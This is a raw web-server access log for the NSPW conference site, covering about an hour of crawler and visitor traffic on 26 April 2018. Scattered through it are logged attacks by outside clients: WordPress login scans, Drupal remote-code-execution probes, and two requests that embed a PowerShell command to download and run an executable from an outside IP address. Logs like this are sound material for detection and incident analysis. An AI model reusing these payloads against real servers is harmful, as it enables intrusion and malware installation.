www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:02:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 78.30.155.178 - - [26/Apr/2018:09:03:33 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 78.30.155.178 - - [26/Apr/2018:09:03:36 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 94.189.195.228 - - [26/Apr/2018:09:04:03 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 94.189.195.228 - - [26/Apr/2018:09:04:04 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.221 - - [26/Apr/2018:09:04:47 -0400] "GET /papers/2013/nspw2013-sundaramurthy.pdf HTTP/1.1" 302 605 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:04:48 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:05:40 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 107.167.112.4 - - [26/Apr/2018:09:05:59 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 302 593 "-" "Opera/9.80 (Android; Opera Mini/7.5.35263/95.90; U; en) Presto/2.12.423 Version/12.16"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:06:47 -0400] "GET /papers/2012/forms/contents.htm HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:06:56 -0400] "GET /2005/cfp/latex/macros.sty HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:07:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:07:24 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 154.70.184.17 - - [26/Apr/2018:09:07:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 154.70.184.17 - - [26/Apr/2018:09:07:40 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:08:05 -0400] "GET /2009/proceedings/2011/ HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:08:15 -0400] "GET /2009/proceedings/1999/?C=N;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:08:51 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:09:07 -0400] "GET /papers/1998/nspw1998-beaver.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 86.96.92.100 - - [26/Apr/2018:09:09:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 86.96.92.100 - - [26/Apr/2018:09:09:42 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:10:51 -0400] "GET /2005/cfp/latex/macros.sty HTTP/1.1" 302 579 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:11:36 -0400] "GET /papers/2010/?C=N;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:11:43 -0400] "GET /papers/2004/nspw2004-allwein.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:12:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:12:34 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:13:26 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:15:10 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 112.204.140.219 - - [26/Apr/2018:09:15:56 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.204.140.219 - - [26/Apr/2018:09:15:58 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 223.73.5.234 - - [26/Apr/2018:09:16:16 -0400] "GET / HTTP/1.1" 302 529 "http://www.sigsac.org" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
www.nspw.org:80 185.145.253.66 - - [26/Apr/2018:09:16:24 -0400] "POST /?q=user/password&name[%23post_render][]=system&name[%23markup]=pwd&name[%23type]=markup HTTP/1.1" 302 655 "http://nspw.org/wp-admin/admin-ajax.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36"
www.nspw.org:80 185.145.253.66 - - [26/Apr/2018:09:16:28 -0400] "POST /?q=file/ajax/name/%23value/form-ATraDn458WdJae89yLOTXvwixyCPxprR0UB18qxvCrs HTTP/1.1" 302 619 "http://nspw.org/wp-admin/admin-ajax.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36"
www.nspw.org:80 60.243.251.76 - - [26/Apr/2018:09:16:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 60.243.251.76 - - [26/Apr/2018:09:16:59 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:17:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:18:37 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 100.43.91.123 - - [26/Apr/2018:09:19:13 -0400] "GET /2009/proceedings/2004/?C=S;O=A HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:19:29 -0400] "GET /papers/2002/nspw2002-inoue.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 180.76.15.137 - - [26/Apr/2018:09:20:02 -0400] "GET /proceedings/2002 HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:20:21 -0400] "GET /papers/2010/nspw2010-coles.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:21:12 -0400] "GET /papers/2010/nspw2010-alsaleh.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:22:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:22:56 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 186.52.171.169 - - [26/Apr/2018:09:23:31 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 186.52.171.169 - - [26/Apr/2018:09:23:34 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:23:48 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 114.134.26.255 - - [26/Apr/2018:09:25:03 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 114.134.26.255 - - [26/Apr/2018:09:25:05 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:25:31 -0400] "GET /papers/2003/nspw2003-mchugh.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.140 - - [26/Apr/2018:09:27:18 -0400] "GET /2003/oc.content HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:27:22 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:28:07 -0400] "GET /papers/2008/nspw2008-greenwald.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:28:59 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:29:50 -0400] "GET /papers/2004/nspw2004-hollebeek.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 197.156.77.120 - - [26/Apr/2018:09:30:01 -0400] "GET /papers/2008/nspw2008-julisch.pdf HTTP/1.1" 302 593 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:30:42 -0400] "GET /2018/ HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 40.77.167.123 - - [26/Apr/2018:09:30:46 -0400] "GET /2012/ HTTP/1.1" 302 539 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.46.13.90 - - [26/Apr/2018:09:30:57 -0400] "GET /2009/proceedings/1999/nspw1999-schneider.pdf HTTP/1.1" 302 617 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:31:34 -0400] "GET /2006/cfp/?C=N;O=D HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 197.210.28.187 - - [26/Apr/2018:09:32:00 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 197.210.28.187 - - [26/Apr/2018:09:32:07 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:32:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:34:06 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:34:51 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:35:01 -0400] "GET /papers/2009/nspw2009-misra.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 88.215.47.194 - - [26/Apr/2018:09:36:12 -0400] "GET /2018/?utm_source=infosec-conferences-com&utm_medium=directory&utm_campaign=free-listing HTTP/1.1" 302 711 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
www.nspw.org:80 ::1 - - [26/Apr/2018:09:36:21 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [26/Apr/2018:09:36:22 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [26/Apr/2018:09:36:23 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:36:46 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 52.27.2.86 - - [26/Apr/2018:09:37:09 -0400] "GET /2018/?utm_source=infosec-conferences-com&utm_medium=directory&utm_campaign=free-listing HTTP/1.1" 302 655 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
www.nspw.org:80 177.42.253.130 - - [26/Apr/2018:09:37:17 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:37:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:37:37 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:38:28 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.107 - - [26/Apr/2018:09:38:55 -0400] "GET /2013/local HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:39:20 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 177.42.187.237 - - [26/Apr/2018:09:40:43 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 177.42.187.237 - - [26/Apr/2018:09:40:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [26/Apr/2018:09:41:19 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 158.69.252.83 - - [26/Apr/2018:09:41:40 -0400] "GET / HTTP/1.1" 302 531 "-" "python-requests/2.18.4"
www.nspw.org:80 158.69.252.83 - - [26/Apr/2018:09:41:40 -0400] "GET / HTTP/1.1" 302 531 "-" "python-requests/2.18.4"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:42:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:44:31 -0400] "GET /2009/proceedings/2005/?C=N;O=A HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:45:23 -0400] "GET /2005/cfp/latex/toplas.pdf HTTP/1.1" 302 579 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:46:15 -0400] "GET /papers/1999/nspw1999-lipson.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:09:47:13 -0400] "GET /papers/1994/nspw1994-ferris.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:47:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:50:34 -0400] "GET /papers/2011/nspw2011-wash.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:51:25 -0400] "GET /2014/ HTTP/1.1" 302 539 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 207.46.13.90 - - [26/Apr/2018:09:51:28 -0400] "GET /papers/1997/nspw1997-hinton.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:52:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 117.207.227.128 - - [26/Apr/2018:09:52:33 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 117.207.227.128 - - [26/Apr/2018:09:52:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.13 - - [26/Apr/2018:09:53:22 -0400] "GET /papers/2012/docs/welcome1.pdf HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 185.234.217.11 - - [26/Apr/2018:09:53:57 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=cmd.exe+/c+PowerShell+(New-Object+System.Net.WebClient).DownloadFile('http://87.105.153.226/phpmyadmin//config/lsas.exe','lsas.exe');Start-Process+'lsas.exe' HTTP/1.1" 302 973 "-" "curl/7.35.0"
www.nspw.org:80 109.163.228.35 - - [26/Apr/2018:09:54:47 -0400] "GET / HTTP/1.1" 302 488 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:54:52 -0400] "GET /papers/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 302 605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 185.234.217.11 - - [26/Apr/2018:09:56:15 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=cmd.exe+/c+PowerShell+(New-Object+System.Net.WebClient).DownloadFile('http://87.105.153.226/phpmyadmin//config/lsas.exe','lsas.exe');Start-Process+'lsas.exe' HTTP/1.1" 302 973 "-" "curl/7.35.0"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:09:56:36 -0400] "GET /papers/2010/nspw2010-bratus.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:09:57:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 39.44.138.216 - - [26/Apr/2018:09:57:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 39.44.138.216 - - [26/Apr/2018:09:57:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [26/Apr/2018:09:59:11 -0400] "GET /papers/2008/nspw2008-julisch.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:10:00:55 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:10:01:47 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:10:02:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:10:02:39 -0400] "GET /papers/1996/nspw1996-zurko.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 220.247.247.208 - - [26/Apr/2018:10:03:21 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 220.247.247.208 - - [26/Apr/2018:10:03:25 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [26/Apr/2018:10:03:30 -0400] "GET /papers/1997/nspw1997-meadows.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 61.181.142.89 - - [26/Apr/2018:10:03:53 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 61.181.142.89 - - [26/Apr/2018:10:03:56 -0400] "POST /trackback/ HTTP/1.1" 302 512 "http://www.nspw.org" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 34.224.23.72 - - [26/Apr/2018:10:04:24 -0400] "GET /2014/local HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)"
www.nspw.org:80 186.220.243.170 - - [26/Apr/2018:10:04:48 -0400] "GET /cgi/common.cgi HTTP/1.1" 302 503 "-" "Wget(linux)"
www.nspw.org:80 189.122.225.78 - - [26/Apr/2018:10:04:48 -0400] "GET /cgi/common.cgi HTTP/1.1" 302 503 "-" "Wget(linux)"
www.nspw.org:80 186.220.243.170 - - [26/Apr/2018:10:04:51 -0400] "GET /stssys.htm HTTP/1.1" 302 495 "-" "Wget(linux)"
www.nspw.org:80 189.122.225.78 - - [26/Apr/2018:10:04:51 -0400] "GET /stssys.htm HTTP/1.1" 302 495 "-" "Wget(linux)"
www.nspw.org:80 186.220.243.170 - - [26/Apr/2018:10:04:54 -0400] "GET / HTTP/1.1" 302 475 "-" "Wget(linux)"
www.nspw.org:80 189.122.225.78 - - [26/Apr/2018:10:04:54 -0400] "GET / HTTP/1.1" 302 475 "-" "Wget(linux)"
